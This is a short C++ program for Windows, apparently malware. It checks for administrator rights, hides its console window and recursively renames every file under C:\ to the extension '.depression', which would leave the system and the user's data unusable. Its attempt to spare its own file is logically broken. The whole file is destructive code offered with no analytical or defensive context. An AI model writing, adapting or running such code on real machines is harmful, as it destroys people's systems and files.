#include <iostream>
#include <filesystem>
#include <string>
#include <windows.h>
#include <shellapi.h>

namespace fs = std::filesystem;

void renameFilesInDirectory(const fs::path& directory) {
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            fs::path newPath = entry.path();
            newPath.replace_extension(".depression");
            fs::rename(entry.path(), newPath);
        } else if (entry.is_directory()) {
            renameFilesInDirectory(entry.path());
        }
    }
}

int main() {
    // Check for admin rights
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            isAdmin = elevation.TokenIsElevated;
        }
    }

    if (!isAdmin) {
        // Prompt the user to run as admin
        MessageBox(NULL, "Please run this program as an administrator.", "Admin Rights Required", MB_OK | MB_ICONINFORMATION);
        return 0;
    }

    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Get the current executable path
    fs::path executablePath = fs::current_path();
    std::string executableName = executablePath.filename().string();

    // Get the root directory
    fs::path rootPath = "C:\\";  // Change this if you want to target a different root

    // Rename files in the root directory and all subdirectories
    renameFilesInDirectory(rootPath);

    // Exclude the executable itself from being renamed
    fs::path selfPath = executablePath / executableName;
    fs::path newSelfPath = selfPath;
    newSelfPath.replace_extension(".depression");
    if (fs::exists(newSelfPath)) {
        fs::rename(newSelfPath, selfPath);
    }

    return 0;
}
